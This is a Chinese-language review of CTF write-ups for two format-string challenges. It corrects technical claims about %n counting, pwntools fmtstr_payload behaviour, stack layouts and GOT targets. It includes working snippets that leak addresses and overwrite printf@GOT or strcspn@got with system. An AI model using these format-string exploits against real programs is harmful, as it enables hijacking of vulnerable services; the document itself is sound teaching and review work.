# Review Round 2 — pwn2 `mad_libs` / pwn3 `revolution` 格式化字串筆記複審（新手視角）

複審者：review round 2（第 2/3 輪）
複審範圍：`pwn2/notes.md`、`pwn2/exploit.py`、`pwn3/notes.md`、`pwn3/exploit.py`，並對照 `wp/00_基礎知識_從零開始.md` 檢查術語一致性。
複審方法：**每一條技術主張都重新對 binary 驗證過**（`objdump -d -M intel` / `readelf` / `gdb -q -batch` / `/proc/<pid>/maps` / `/proc/<pid>/mem` / pwntools），並**實際跑完 4 次 exploit（local ×2、REMOTE ×2）**。

**一句話結論**：兩題的核心技術鏈（pwn2 的 arg#8/0x2a1ca/0x11c9/printf@GOT→system；pwn3 的 `0x401330`/`overflow_arg_area = buf`/`setvbuf@got→0x88540`/`strcspn@got→system`）**全部正確、4 次實測全部 PASS**。錯的地方集中在「教學用解說層」：一個 `%n` 計數規則講反了、`write_size='byte'` 的敘述與 pwntools 實際行為不符、兩張 ASCII 圖標錯位置，以及 `wp/00` 對 pwn3 的描述與 `pwn3/notes.md` 互相矛盾。

嚴重度統計：**高 5、中 6、低 4**（另新手卡點 8 項）。

---

## 1. 錯誤清單

### [E1] 高 — pwn2/notes.md:848（§9 常見坑 5）：`%n` 的計數規則講反了

**原文**
> 5. **別忘了「已經印出的字元數」也要算進 `%n` 的值**。格式字串裡的**字面文字**（例如 `%17$hhn` 這 7 個字元本身）也會增加計數！`fmtstr_payload` 會處理，手寫時務必小心。

**正確值**
`%n` 寫入的值 = **這個 `printf` 呼叫到目前為止「真正輸出到 stdout 的字元數」**。格式指令（`%64c`、`%17$hhn`、`%n`）本身**不會輸出任何字元、不增加計數**；會增加計數的只有：
1. `%c` / `%<寬度>c` 印出來的填充字元（`%64c` 貢獻 64，不是 64+4）；
2. 格式字串裡**不屬於任何格式指令**的裸文字（例如 `fmtstr_payload` 為了對齊補的 `aaaaba`，貢獻 6）。

所以「`%17$hhn` 這 7 個字元本身也會增加計數」是錯的。照這條規則手寫會多算 7×N 個字元 → 寫入的值全錯 → 直接 segfault，而新手只會看到「莫名其妙爆掉」。

**驗證指令（實測）**
```bash
cd /home/kzzz/Documents/code/ctf/sunshine/pwn2
python3 - <<'EOF'
from pwn import *
context.log_level='error'; context.arch='amd64'
io=process(['./ld-linux-x86-64.so.2','--library-path','.','./mad_libs'],cwd='.')
pid=io.pid
io.recvuntil(b'(1) > '); io.sendline(b'|'.join(b'%%%d$p'%i for i in (41,43,47)))
line=io.recvuntil(b'(2) > ',timeout=5); line=line[:-len(b'(2) > ')].strip()
c,ret,mainp=[int(x,16) for x in line.split(b'|')]
lb=ret-0x2a1ca; pb=mainp-0x11c9
payload=fmtstr_payload(8,{pb+0x4010:p64(lb+0x58740)[:6]},write_size='byte',numbwritten=0,badbytes=b'\n')
print('payload:', payload)
io.sendline(payload); time.sleep(0.5); io.recvrepeat(0.4)
def rd(a,n=8):
    with open('/proc/%d/mem'%pid,'rb') as f:
        f.seek(a); return f.read(n)
after=u64(rd(pb+0x4010))
print('GOT=%#x  低byte=%#x  system 低byte=%#x' % (after, after&0xff, (lb+0x58740)&0xff))
EOF
```
實測：payload 以 `%64c%17$hhn...` 開頭，而 GOT 最低 byte 正好是 `0x40`（= 64，system 的最低 byte），**不是 64+4+7=75**；這就證明格式指令本身不計數。

**建議替換文字**
> 5. **要算進 `%n` 的值只有「真的被印出來的字元」**。格式指令本身（`%64c`、`%17$hhn`、`%n`）不會印出任何東西，所以不增加計數；`%64c` 只貢獻 64。會增加計數的只有兩種：`%<寬度>c` 的填充、以及格式字串裡**不是格式指令**的裸文字（例如對齊用的 `aaaaba` 貢獻 6）。所以 `%64c%17$hhn` 之後的計數是 **64**，不是 75。
> 想自己驗證：把位址指到 `printf@GOT`，寫完後用 `/proc/<pid>/mem` 讀回來看最低 byte 是不是你要的值（見本節驗證腳本）。

---

### [E2] 中 — pwn2/notes.md:71（§1(2)）：`fgets` 讀入長度與最高寫入位址寫錯

**原文**
> 但是！這題的 `fgets(buf, 0x100, stdin)` 讀 `0x100` 位元組到 `[rbp-0x110]`，**最多只寫到 `rbp-0x10`，碰不到 `rbp-8` 的 canary**。

**正確值**
`fgets(buf, 0x100, stdin)` 最多讀 **0x100−1 = 255 (0xFF) 個字元**，然後補一個 `'\0'`，所以最高被寫到的位元組是 `buf[255]` = **`rbp-0x11`**（不是 `rbp-0x10`）。距離 `rbp-8`（canary）還有 8 bytes 緩衝。結論（打不到 canary → 沒有堆疊溢位）是對的，但兩個數字都寫偏了；而且同一份筆記第 468 行自己寫「`fgets` 的 255 上限」，前後不一致。

**驗證指令**
```bash
cd /home/kzzz/Documents/code/ctf/sunshine/pwn2
objdump -d -M intel mad_libs | sed -n '/123e:/,/1246:/p'   # 看到 mov esi,0x100 → size=256 → 最多 255 字元 + NUL
```

**建議替換文字**
> 但是！這題 `fgets(buf, 0x100, stdin)` 的 size 是 256，`fgets` 最多讀 **255 (0xFF) 個字元**再補一個 `'\0'`，所以最高只寫到 `buf[255]`（= `rbp-0x11`），離 `rbp-8` 的 canary 還有 8 bytes。**這題沒有堆疊溢位**。

---

### [E3] 高 — pwn2/notes.md:463-468（§3.4）＋ pwn2/exploit.py:81-86：`write_size='byte'` ≠ 「6 個 `%hhn`、最多 255 個填充字元」

**原文**
> notes:464 `* write_size='byte'`：切成 6 個 1-bytes → 6 個 `%hhn`，需要 6 個指標（48 bytes 位址）。
> notes:467-468 `%hhn` 的計數最大值是 255，**最多只印 255 個填充字元**（`%hn` 最大 65535，會噴 6 萬個空白，很吵）；6 個 `%hhn` + 48 bytes 位址 = 約 120 bytes，**遠小於 `fgets` 的 255 上限**。
> exploit.py:82-85 docstring：`6 bytes of a libc address == 6 writes.  %hhn keeps the worst case padding at ~255 characters ... (120 bytes ...)`

**正確值**
`pwntools.fmtstr_payload` 的 `write_size_max` **預設是 `'long'`**，所以即使 `write_size='byte'`，它也會把相鄰的 byte 合併成 `%hn`（2 bytes）/ `%n`（4 bytes）/ `%lln`（8 bytes）。因此：
* 本機實測第一次跑就出現 `%17$n`（4-byte 寫入），且**只有 5 個位址**、payload 只有 96 bytes；
* 遠端實測出現 `%1097c%19$hn` → **填充 1097 個字元，遠超 255**；
* 只有在 `write_size_max='byte'` 時才會真的產生 6 個 `%hhn`。
（`fmtstr_payload` 的 docstring 範例自己就寫著 `write_size='byte'` 會輸出 `%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhn...`。）

**驗證指令**
```bash
cd /home/kzzz/Documents/code/ctf/sunshine/pwn2
python3 -c "
from pwn import *
context.log_level='error'; context.arch='amd64'
w={0x5845447ea010: p64(0x73979e04e740)[:6]}
print('default (max=long):', fmtstr_payload(8,w,write_size='byte',numbwritten=0,badbytes=b'\n')[:70])
print('max=byte          :', fmtstr_payload(8,w,write_size='byte',write_size_max='byte',numbwritten=0,badbytes=b'\n')[:70])"
# default  → b'%64c%15$hhn%51c%16$hhn%36c%17$hhn%7c%18$hhn%1097c%19$hna...'
# max=byte → b'%4c%16$hhn%60c%17$hhn%51c%18$hhn%36c%19$hhn%7c%20$hhn%73c%21$hhn...'
```

**建議替換文字（notes §3.4）**
> * `write_size='byte'`：**原則上**以 1-byte 為單位切 → 6 個寫入。
>   ⚠️ 但 `fmtstr_payload` 的 `write_size_max` 預設是 `'long'`，它會把相鄰 byte **自動合併**成 `%hn`（2 bytes）或 `%n`（4 bytes）以縮短格式字串。所以實跑時你可能看到 `%17$n` 或 `%1097c%19$hn`（填充 1097 字元），**不是** 6 個 `%hhn`。
>   想要保證「只用 `%hhn`、填充絕不超過 255」要寫 `write_size_max='byte'`。兩種寫法都能拿到 flag，但要知道差別。
> * 6 個 `%hhn` 需要 6 個指標（48 bytes 位址），總長約 120 bytes，遠小於 `fgets` 的 255 上限。

**建議替換文字（exploit.py:81-86 docstring）**
```python
    """fmtstr_payload() with 1-byte (%hhn) writes.

    6 bytes of a libc address.  NOTE: fmtstr_payload's write_size_max defaults to
    'long', so it may merge neighbouring bytes into %hn/%n (and then it needs up to
    ~1100 padding characters).  Pass write_size_max='byte' if you really want one
    %hhn per byte and a guaranteed <=255 padding.
    """
```

---

### [E4] 中 — pwn2/notes.md:482（§3.4 對齊說明）：推導中間出現錯的位址 `buf[64]`

**原文**
> `buf[0..7]` = 參數 8，`buf[64..71]` = 參數 16… 等等，這裡第一個位址在 `buf[64]` → 64/8 = 8 → 參數 8+8 = 16？實際上是 17，因為 pwntools 的 offset 計算裡「格式字串部分」長度 72 bytes（含 `aaaaba`）→ 72/8 = 9 → 8+9 = 17。

**正確值**
格式指令區長 **72 bytes**（6 組 `%<w>c`+`%N$hhn` = 66 bytes，加上對齊用 `aaaaba` 6 bytes），所以**第一個位址在 `buf[72]`**（不是 `buf[64]`）→ 72/8 = 9 → 參數 8+9 = **17**。結論 17 是對的，但中間那句 `第一個位址在 buf[64]` 是錯的，而這段文字正好是新手最需要看懂的地方（「為什麼是 17 不是 16」）。

**驗證指令**
```bash
python3 -c "p=b'%64c%17\$hhn%52c%18\$hhn%14c%19\$hhn%68c%20\$hhn%12c%21\$hhn%21c%22\$hhnaaaaba'; print(len(p), len(p)//8, 8+len(p)//8)"
# → 72 9 17
```

**建議替換文字**
> `buf[0..7]` = 參數 8、`buf[8..15]` = 參數 9、… 一般式：`buf[8k]` = 參數 `8+k`。
> 對齊填充 `aaaaba` 讓「格式指令區」的長度剛好是 **72 bytes**（66 bytes 指令 + 6 bytes `aaaaba`），所以第一個位址落在 `buf[72]` → `72/8 = 9` → 參數 `8+9 = 17`。**（若格式指令區長度不是 8 的倍數，第一個位址就會落在「半個 slot」上，`%17$hhn` 讀到的是半個位址 + 半個別的東西 → 寫錯地方 → segfault。）**

---

### [E5] 中 — pwn2/notes.md:410-411（§3.3 實測輸出）與 844（§9 常見坑 1）：把 slot 6/7 的值說成「`i` 的殘留」

**原文**
> pos 6: 0x2 ← i 的殘留（不是輸入！）
> pos 7: 0xe ← 殘留:i
> （§9-1）`%6$p`/`%7$p` 印出來的是 `rbp-0x120`、`rbp-0x118` 的殘留（第 7 個的高 4 bytes 還是迴圈計數器 `i`）

**正確值**
* `i` 在 `[rbp-0x114]`，也就是 **slot 7 的高 4 bytes**。slot 6（`rbp-0x120`）**跟 `i` 無關**。
* 而 `printf(buf)` 跑在**第一次迴圈**，此時 `i` 才剛被初始化為 0（`1205: mov DWORD PTR [rbp-0x114],0x0`），所以 slot 7 的高 4 bytes 一定是 `0`；印成 `0xe` 代表「低 4 bytes 是殘留 0xe、高 4 bytes 是 i=0」。**`0xe` 不可能是 `i`**（`i` 只會是 0~7），把它標成「殘留:i」會讓新手以為迴圈計數器會亂跳。
* 實測本機 pos6 / pos7 印 `(nil)` / `(nil)`（殘留值每次都可能不同）。

**驗證指令**
```bash
cd /home/kzzz/Documents/code/ctf/sunshine/pwn2
python3 -c "
from pwn import *
context.log_level='error'
io=process(['./ld-linux-x86-64.so.2','--library-path','.','./mad_libs'],cwd='.')
io.recvuntil(b'(1) > ')
io.sendline(b'AAAABBBB'+b'|'.join(b'%%%d\$p'%i for i in range(1,17)))
print(io.recvuntil(b'(2) > ',timeout=5))"
# 實測 → 0x5555907b42a1|0xfbad2088|0x6f84bd5f|0x5555907b42ff|(nil)|(nil)|(nil)|0x4242424241414141|...
```

**建議替換文字**
> pos 6: `<殘留>` ← `rbp-0x120`，上一次呼叫留下的垃圾（跟 `i` 無關）
> pos 7: `<殘留>` ← `rbp-0x118`；低 4 bytes 是殘留，**高 4 bytes 是迴圈計數器 `i`**。第一次迴圈時 `i = 0`，所以這 8 bytes 的高半部就是 `0`，看起來像個小數字。
> （`%6$p`、`%7$p` 印出來的值每次都可能不同，**唯一穩定不變的是 pos 8 = 你輸入的前 8 bytes**。）

---

### [E6] 低 — pwn2/notes.md:858（§9 常見坑 14）：本機「看得到」`sh: -c:` 訊息，但照 §8 跑其實看不到

**原文**
> 14. **`process()` 的 stderr 預設會併到 stdout**，所以本機測試看得到 `sh: -c:` 訊息；遠端不一定會轉發 stderr，所以**不要依賴**那行訊息來判斷成功。

**正確值**
exploit.py 在送 `/bin/sh` 之後呼叫 `drain(io, 0.3)`，**把那行 stderr 直接吞掉且沒有印出來**，所以照 §8 的方式跑是看不到的（§8 的輸出裡也沒有）。另外訊息內容依 `/bin/sh` 而異：
* 本機 Arch（`/bin/sh → bash`）實測：`sh: -c: line 1: syntax error near unexpected token \`newline'` ／ `sh: -c: line 1: \`(%d) > '`（與 §9-8 引用的文字一致）；
* Ubuntu（`/bin/sh → dash`）會是 `sh: 1: Syntax error: "(" unexpected`。

**驗證指令**：見 §4.5。

**建議替換文字**
> 14. `system("(%d) > ")` 會讓 shell 在 stderr 抱怨語法錯誤（bash：`sh: -c: line 1: syntax error near unexpected token \`newline'`；dash：`sh: 1: Syntax error: "(" unexpected`）。本 exploit 用 `drain()` 把它讀掉丟棄，所以你在輸出裡看不到 —— 這是刻意的。遠端也不一定轉發 stderr，**不要靠這行判斷成功**，要看 GOT 是否真的被改（§5 的 `/proc/<pid>/mem` 驗證）。

---

### [E7] 低 — pwn2/notes.md:724（§7 逐行解說）：引用的 Python 不是 `exploit.py` 裡的程式碼

**原文**
> `canary, saved_rbp, ret, mainp = (int(x, 16) for x in raw.split(b"|"))`

**正確值**
`exploit.py:118-127` 是 `try:` + `canary_s, rbp_s, ret_s, main_s = raw.split(b"|")` + 四次 `int(...,16)` + `except`。筆記自己 §9-6 說「`(nil)` 會讓 `int(b"(nil)",16)` 丟例外」，所以**引用版本遇到 `(nil)` 會直接炸**，而真實版本不會。§7 開頭聲稱是「`exploit.py` 逐行解說」，這裡必須標明是簡化版。

**建議替換文字**
> （下面為了閱讀方便，把 `try/except` 與長度檢查省略了；完整版本請看 `exploit.py:109-127`。實務上一定要包 `try/except`，因為殘留值有可能是 `(nil)`，`int(b"(nil)", 16)` 會丟例外。）

---

### [E8] 低 — pwn2/notes.md:791 與 820（§8 實際輸出）：引用的 payload 長度／組成與實跑不同

**原文**：`[*] write payload (112 bytes): b'%64c%16$hhn%9c%17$hhn%54c%18$hhn...'` / `(120 bytes): b'%64c%17$hhn%52c%18$hhn%14c%19$hhn...'`

**正確值**：payload 的長度與「幾個 `%hhn`／會不會出現 `%n`／`%hn`」取決於該次 ASLR 抽到的位址 bytes（見 E3）。本輪實測本機得到 **96 bytes**、內容含 `%17$n`；遠端得到 **96 bytes**、內容含 `%1097c%19$hn`。這不是「錯」，但引用單一次輸出會讓新手以為「永遠是 6 個 `%hhn`、120 bytes」。

**建議**：在 §8 的輸出前後加一句「（ASLR 每次不同，payload 長度與格式指令組成也會不同；重點是 `len(payload) <= 0xFF` 且不含 `\n`）」。

---

### [F1] 高 — pwn3/notes.md:628（§7.2 堆疊圖）：把 `printf` 保存的 `rbx` 標在 `buf-0x10`

**原文**
```
   buf-0x08   │  printf 的返回位址（0x40113d）      │
   buf-0x10   │  printf 保存的 rbx = buf            │
```

**正確值**
`printf`（`0x401330`）進場依序 `push r15; push r14; push r13; push r12; push rbp; push rbx`，六個 push 由高位址往低位址排：
| 位置 | 內容 |
|---|---|
| `buf-0x08` | 返回位址 = `0x40113d` ✅（筆記正確） |
| `buf-0x10` | printf 保存的 **r15**（= main 的 r15，實測 `0x403dd0`） |
| `buf-0x18` | 保存的 r14（`0x402009` = `"0123456789abcdef"`） |
| `buf-0x20` | 保存的 r13 |
| `buf-0x28` | 保存的 r12（`0x40201a` = `"score> "`） |
| `buf-0x30` | 保存的 rbp（= main 的 rbp = `0x402022` = `"\n"`） |
| **`buf-0x38`** | **保存的 rbx = `buf`** ← 筆記把它標成 `buf-0x10` 是錯的 |

**驗證指令（可直接貼，也修掉 [F2]）**
```bash
cd /home/kzzz/Documents/code/ctf/sunshine/pwn3
printf '%%6$p\n' > /tmp/rev_in
gdb -q -batch -ex 'file ./revolution' -ex 'break *0x4013d9' -ex 'run < /tmp/rev_in' \
    -ex 'p/x $rsp' -ex 'p/x $rsp+0x120' -ex 'x/6gx $rsp+0xe0' -ex 'info registers rdi r15'
```
實測輸出（節錄）：
```
$1 = 0x7fffffffdac0        ← printf 內部的 rsp
$2 = 0x7fffffffdbe0        ← rsp+0x120 == buf（r15/rdi 也等於 0x7fffffffdbe0，"%6$p" 就在這裡）
0x7fffffffdba0: 0x0   0x7fffffffdbe0   ← [rsp+0xe0]=0, [rsp+0xe8]=buf  ★ 保存的 rbx 在 buf-0x38
0x7fffffffdbb0: 0x402022  0x40201a       ← 保存的 rbp("\n")、r12("score> ")
0x7fffffffdbc0: 0x1       0x7ffff7ffd000
0x7fffffffdbd0: 0x403dd0  0x40113d       ← [buf-0x10]=r15, [buf-0x08]=返回位址
```

**建議替換文字**
```
   buf-0x08   │  printf 的返回位址（0x40113d）      │
   buf-0x10   │  printf 保存的 r15（= main 的 r15） │
   buf-0x18   │  printf 保存的 r14 / r13 / r12 / rbp │
   buf-0x38   │  printf 保存的 rbx = buf  ★         │  ← 就是 §4.1 gdb 印的 [rsp+0xe8]
   buf-0x120  │  printf 內部的 rsp  ★ overflow_arg_area = rsp+0x120 = buf
```
（六個 push = 0x30 bytes，從 `buf-0x10` 一路排到 `buf-0x38`；`sub rsp,0xe8` 之後 rsp = `buf-0x120`。）

---

### [F2] 高 — pwn3/notes.md:295-301（§4.1）：關鍵的 gdb 驗證步驟無法照抄執行

**原文**
```
$ gdb -q -batch -ex 'file ./revolution' -ex 'break *0x4013d9' \
      -ex 'run < <(printf "%%6\$p\n")' -ex '...'   # (節錄)
saved rbx [rsp+0xe8] = 0x7fffffffdbe0      ← main 的 rsp，也就是 buf
overflow_arg_area    = 0x7fffffffdbe0      ← 一模一樣！
equal? YES overflow_arg_area == buf
```

**問題**
1. `-ex '...'` 是佔位符（照貼會噴 `No symbol "..."`）。
2. `run < <(printf ...)` 需要 bash 的 process substitution，但 gdb 是用 `/bin/sh` 開子 shell；Ubuntu/Debian 的 `/bin/sh` 是 dash → `sh: 1: Syntax error: "(" unexpected`（本機 Arch 的 `/bin/sh` 是 bash 才剛好會過）。
3. 沒有任何指令會印出 `saved rbx [rsp+0xe8]` 或 `overflow_arg_area`——新手無法重現那三行結論。

**這一段是本題**（`overflow_arg_area == buf`）**唯一的直接證據**，卻不可重跑，是 pwn3 最嚴重的新手卡點。

**建議替換文字（完整可貼；同時涵蓋 [F1]）**
```bash
cd /home/kzzz/Documents/code/ctf/sunshine/pwn3
printf '%%6$p\n' > /tmp/rev_in                    # 不能用 <(...)：gdb 的子 shell 可能是 dash
gdb -q -batch -ex 'file ./revolution' \
    -ex 'break *0x4013d9' \                       # 這裡是 printf 剛建好 va_list 的下一行
    -ex 'run < /tmp/rev_in' \
    -ex 'p/x $rsp' -ex 'p/x $rsp+0x120' \         # overflow_arg_area == rsp+0x120
    -ex 'info registers rdi r15' \                # rdi/r15 == fmt == buf
    -ex 'x/1gx $rsp+0xe8'                         # [rsp+0xe8] == 保存的 rbx == buf
```
實際輸出應該長這樣（我實測的）：
```
$1 = 0x7fffffffdac0
$2 = 0x7fffffffdbe0
rdi            0x7fffffffdbe0
r15            0x7fffffffdbe0
0x7fffffffdbe0: 0x0000000070243625      ← 也就是 "%6$p"
```
→ `rsp+0x120 == r15 == rdi == buf`，**這就證明了「第 6 個之後的可變參數 = 我們的輸入」**。

---

### [F3] 中 — pwn3/notes.md:583-587（§7.1 靜態資料圖）：`.init_array` / `.fini_array` 的內容寫反了

**原文**
```
        0x403dc0  ┌──────────────────────────────┐  .init_array（開機時執行）
                  │  0x401280 (dtors), 0x4012b0  │
        0x403dd0  ├──────────────────────────────┤  .fini_array
```

**正確值**
| 位址 | section | 實際內容 |
|---|---|---|
| `0x403dc0` | `.init_array` | `[0x4012b0, 0x401190]` ← **`0x401190` 就是 §1.2 說的「對 stdout/stderr 做 `setvbuf(_IONBF)`」的初始化函式** |
| `0x403dd0` | `.fini_array` | `[0x401280]`（`__do_global_dtors_aux` 那類收尾函式） |

筆記把 `0x401280` 放在 `.init_array`、又只寫 `.fini_array` 是空的，兩者都不對。修正後同時補上了 §8.3「`setvbuf` 在 main 之前就被呼叫過，所以 GOT 一定有真實位址」的**機制證據**（`0x401190` 是 `.init_array[1]`）。

**驗證指令**
```bash
cd /home/kzzz/Documents/code/ctf/sunshine/pwn3
objdump -s -j .init_array revolution      # 403dc0 b0124000... 90114000...  → 0x4012b0, 0x401190
objdump -s -j .fini_array revolution      # 403dd0 80124000...              → 0x401280
readelf -SW revolution | grep -E "init_array|fini_array"
```

**建議替換文字**
```
        0x403dc0  ┌──────────────────────────────┐  .init_array（main 之前執行）
                  │  0x4012b0 (frame_dummy)      │
                  │  0x401190 (stdio init:       │  ★ 就是它呼叫 setvbuf(_IONBF)，
                  │            setvbuf stdout/   │    所以 0x404020 的 GOT 值一定是
                  │            stderr = _IONBF)  │    已解析的真 libc 位址（§8.3）
        0x403dd0  ├──────────────────────────────┤  .fini_array
                  │  0x401280 (dtors)            │
        0x403dd8  ├──────────────────────────────┤  .dynamic
```

---

### [F4] 中 — pwn3/notes.md:757（§9.2 標題）、861（§11 常見坑 6）：「只能執行一行」只在遠端成立

**原文**
> ### 9.2 為什麼只能執行「一行」？（重要觀念）
> 6. **`system` 會回傳 `int`，高 32 bit 是垃圾 → 只能打一行。**

**正確值**
機制說明本身正確（`main` 在 `0x401132` 執行 `mov BYTE PTR [rsp+rax*1],0`，用的是 `strcspn` 回傳的**完整 64-bit** `size_t`；`system` 只保證 `eax` 有效，高位是**未定義**）。但「一定只能一行」是**實作相依**，不是通則：
* **遠端**（Ubuntu glibc 2.39-0ubuntu8.3）實測：一行後 SIGSEGV ✅（筆記的表格標了「（遠端）」，那部分是對的）；
* **本機**（Arch `/usr/lib/libc.so.6`，本系列 `exploit.py` 不加參數時用的就是它）實測：把 `strcspn@got` 換成 `system` 後**連送兩行都存活**，還正常印出下一個 `score> `。

新手照 §11-6 的語氣會以為本機也一樣，結果本機跑出多一行 `score> ` 就以為自己寫錯了。

**驗證指令**：見 §4.7。

**建議替換文字（§11-6）**
> 6. **`system` 回傳 `int`，rax 的高 32 bit 是「未定義」→ 遠端會在一行之後 SIGSEGV，所以所有指令要塞進同一行 `sh -c`。**
>    本機 Arch glibc 實測「不會」爆（可連送多行），但**不要依賴這個行為**：不同的 libc/編譯方式都可能讓高 32 bit 帶著垃圾，`buf[rax] = 0` 就會寫到野位址。exploit 一律塞同一行是唯一安全的寫法。

---

### [F5] 中 — pwn3/notes.md:697-738（§9 `exploit.py` 逐行註解）：引用的是改寫版，不是檔案內容

**差異清單**（notes 行號 → `pwn3/exploit.py` 實際行號）
| notes | 實際檔案 | 差異 |
|---|---|---|
| 701 | :107 | ✅ 一致（`process('./revolution')`） |
| 706 | :116 | ✅ 一致 |
| — | :114-115 | notes 缺 `assert b'\n' not in payload`、`assert len(payload) < 0x1ff` |
| — | :119 | notes 缺 `assert data.endswith(b'\n')`（這是「解析對不對」的重要自檢） |
| 712-714 | :124-126 | notes 併成一行呼叫，實際是兩行（`payload = payload.ljust(...) + p64(addr)` 然後 `return self.fmt(payload)`）；語意等價 |
| 728 | :149-150 | notes 寫 `assert self.fmt(...) == b'ok'`，實際是 `out = ...; assert out == b'ok', out` |
| — | :45 | notes §9 完全沒出現 `_argv = list(_sys.argv[1:])`（REMOTE 偵測的關鍵，只在 §11-1 提） |
| 736 | :161-162 | `COMMANDS` 實際含 `2>/dev/null`、`/home/*/flag.txt /app/flag.txt`、本機 flag 的絕對路徑、`ls -la /`；notes 用 `...` 省略 |

**建議**：§9 開頭加一句「（以下為精簡版：省略了 `assert`、`try/except` 與 `COMMANDS` 的細節，完整內容請直接看 `exploit.py`）」，或直接貼真實檔案內容。新手把 §9 當成「檔案內容」來對照會對不上。

---

### [F6] 低 — pwn3/notes.md:786-800 與 803-823（§10 實際執行結果）：引用的輸出與實跑不同

**正確值（實測）**
* 本機：flag 會印**兩次**（`COMMANDS` 同時 `cat flag.txt` 與本機絕對路徑），結尾還會多一行 `score> `（本機不會 SIGSEGV，見 F4）；`pwn3/local_run.log` 也確實是兩次。
* 遠端：中間有**一整段 `ls -la /`** 的根目錄列表（`pwn3/remote_run.log` 有），notes §10.2 省略了。

**建議**：兩段都標「（節錄；實際輸出多一段 `ls -la /` 與重複的 flag）」，或直接貼 `local_run.log` / `remote_run.log`。

---

### [W1] 高 — wp/00_基礎知識_從零開始.md:883 與 440：對 pwn3 的描述與 `pwn3/notes.md` 互相矛盾

**原文**
> wp/00:883 `| revolution | pwn3/revolution | 26002 | 自製 printf 的長度整數問題 → .bss 溢寫 | ../pwn3/notes.md |`
> wp/00:440 `| **Missing bounds check** | 長度沒檢查就 memcpy(dst, src, len) | pwn3、pwn6 |`

**正確值**
`pwn3/notes.md` §11-7（第 864-870 行）**花了一整段在駁斥**這個說法：
> 7. **不要相信題目提示裡的「`.bss 0x4060` 的 16-bit 長度整數溢位 + `memcpy`」說法。**…
>    真正的原因在 §4.1 / §6：`overflow_arg_area` 初始化成 `buf`。

而共同基礎文件卻把那個「都市傳說」當成 pwn3 的核心技巧寫進對照表。新手照著閱讀順序（先讀 wp/00、再讀 pwn3）會直接被誤導，而且是**兩份文件互相打架**。

**建議替換文字（wp/00:883）**
> | revolution | `pwn3/revolution` | 26002 | 自製 printf 的 `va_list.overflow_arg_area` 指向輸入緩衝區 → `%N$s` / `%N$w` 任意讀寫 → `strcspn@got` 覆寫成 `system` | `../pwn3/notes.md` |

**建議替換文字（wp/00:440，把 pwn3 從該列拿掉）**
> | **Missing bounds check** | 長度沒檢查就 `memcpy(dst, src, len)` | pwn6 |

---

## 2. 新手卡點（含可直接貼上的補充文字）

### [N1] pwn3 沒有教「不靠 gdb 也能自己找出參數編號」的方法（pwn2 §4 有，pwn3 沒有）

任務要求「新手必須能重做 offset 的發現過程」。pwn2 §4 有完整的技巧 A/B/C/D ✅（我照著掃，pos 8 = `0x4242424241414141` 完全吻合）。但 pwn3 只給了 §4.1 那段**不可執行**的 gdb 節錄（[F2]），沒有「送標記 → 用 `%N$p` 掃 → 看到自己的標記」這種暴力法。

**建議插入位置**：`pwn3/notes.md` §5 的「★★ 關鍵技巧」之前（或 §4.7 之後），貼上以下內容（我已實測，輸出是真的）：

> #### ★ 不靠 gdb 也能自己驗證「arg 6 = buf」與「arg 14 = buf+0x40」
>
> 跟 pwn2 一樣，我們可以在輸入裡放一個好認的標記，然後用 `%N$p` 掃過去。
> ```python
> # pwn3_marker.py
> from pwn import *
> context.log_level = 'error'
> io = process('./revolution')
> io.recvuntil(b'score> ')
>
> def send(p):
>     io.send(p + b'\n')
>     return io.recvuntil(b'score> ', drop=True)[:-1]
>
> # 1) 先證明 arg6 = buf[0..8)：%6$p 會印出 "%6$p\0\0\0\0" 這 8 bytes
> print('arg6 =', send(b'%6$p'))        # → b'0x0000000070243625'
> #  0x0000000070243625 就是 b'%6$p\x00\x00\x00\x00' 的小端解讀 ⇒ arg6 = buf[0..8)
>
> # 2) 再把標記放在 buf+0x40，用 %14$p 找它（0x40/8 = 8 ⇒ 6+8 = 14）
> payload = b'%6$p|%7$p|%14$p|%15$p\x00'.ljust(0x40, b'\x00') + b'AAAABBBB' + b'CCCCDDDD'
> print('scan  =', send(payload))
> ```
> 實測輸出：
> ```
> arg6 = b'0x0000000070243625'
> scan = b'0x2437257c70243625|0x7c70243431257c70|0x4242424241414141|0x4444444443434343'
>                                          ^^^^^^^^^^^^^^^^^^ = "AAAABBBB"（buf+0x40）
>                                                            0x4444444443434343 = "CCCCDDDD"（buf+0x48 = arg15）
> ```
> 於是 `arg14 = buf+0x40`、`arg15 = buf+0x48`、一般式 **`N = 6 + offset/8`**（§11-11）就自己驗證完了 —— **不需要 gdb，也不需要相信任何人的數字**。
> 小技巧：`%N$p` 一定是 16 位 hex（`0x` + 16 位），所以 `%6$p` 的輸出可以直接讀出 `buf` 的前 8 bytes。

### [N2] `IFUNC` 全篇沒定義（pwn3 用了 6 次）

`pwn3/notes.md:173, 595, 596, 690, 774, 851` 都在講 IFUNC，§8.3 還把它當成「為什麼挑 `setvbuf` 而不是 `strcspn`」的理由，但**從頭到尾沒有解釋 IFUNC 是什麼**，`wp/00` 也沒有。（我實測確認這條主張**正確**：本機 `strcspn@got - libc_base = 0x1935c0`，而 `readelf -s` 的 `strcspn` 符號是 `0xaf070`，兩者不同。）

**建議插入位置**：`pwn3/notes.md` §2.5 的「> **重要**」那段之前（或 `wp/00` 名詞表）。

> **什麼是 IFUNC（indirect function）？**
> 有些 libc 函式（`strlen`、`strcspn`、`memcpy`…）在載入時會執行一小段「選擇器」程式碼，依 CPU 支援的指令集挑出最快的實作（例如 `__strcspn_avx2`）。所以**動態連結器寫進 GOT 的是「被挑中的那個實作」的位址，不是 `readelf -s` 上看到的符號值**（符號值是選擇器本身）。
> 實測（本機）：
> ```
> strcspn@got - libc_base = 0x1935c0     ← 實際被挑中的實作
> readelf -s libc | grep strcspn  = 0xaf070  ← 選擇器
> ```
> 這就是為什麼：
> * 拿 `strcspn@got` 當 libc 指紋會誤判（§11-4）；
> * 洩漏來源要挑 `setvbuf`/`read`/`write`/`stdout` 這些**非** IFUNC 的符號。

### [N3] `context.arch='amd64'` 為什麼必要（不設會直接噴例外）

pwn2 用到 `fmtstr_payload`、`p64`，但沒說「不設 `context.arch` 會怎樣」。新手把 §7 的片段複製到新檔案時很容易漏掉這行。實測錯誤訊息：

```
ValueError: pack(): number does not fit within word_size [0, 140022864547856, 4294967296]
  File ".../pwnlib/fmtstr.py", line 307, in make_atoms_simple
    if any(x in badbytes for x in pack(address)):
```
（因為預設 `context.bits = 32`，8 bytes 的位址塞不進 4 bytes。）

**建議插入位置**：`pwn2/notes.md` §7 的 `context.arch = "amd64"` 那一行下方。

